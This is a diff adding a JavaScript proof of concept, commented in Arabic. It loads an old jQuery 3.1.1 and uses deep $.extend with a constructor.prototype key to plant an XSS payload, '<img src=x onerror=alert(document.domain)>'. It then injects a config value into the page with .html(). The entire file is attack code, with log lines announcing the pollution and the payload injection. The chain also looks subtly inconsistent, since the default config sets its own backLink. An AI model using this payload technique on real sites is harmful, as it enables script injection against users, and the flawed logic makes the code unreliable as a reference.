@@ -1,0 +1,34 @@
+const script = document.createElement('script');
+script.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js";
+document.head.appendChild(script);
+
+script.onload = function() {
+    console.log("[+] Vulnerable jQuery loaded!");
+
+    // 1. تنفيذ التلوث باستخدام constructor.prototype مع الانتباه لتطابق الحروف (backLink)
+    $.extend(true, {}, {
+        constructor: {
+            prototype: {
+                backLink: "<img src=x onerror=alert(document.domain)>"
+            }
+        }
+    });
+
+    console.log("[+] Prototype Pollution executed.");
+
+    // 2. تعريف الإعدادات وسحب القيمة الملوثة (هذا هو السطر الذي كان ناقصاً)
+    const defaultConfig = {
+        "backLink": "<a href='http://192.168.139.128:4444/'>Go Back</a>"
+    };
+
+    let config = $.extend(true, {}, defaultConfig);
+
+    const container = document.createElement('div');
+    container.id = 'backLinkContainer';
+    document.body.appendChild(container);
+
+    $('#backLinkContainer').html(config.backLink);
+    console.log("[+] Payload injected into the DOM.");
+}; // قوس إغلاق الدالة يتم وضعه هنا في النهاية تماماً
+
+console.log("[*] Script injected. Waiting for jQuery to load...");
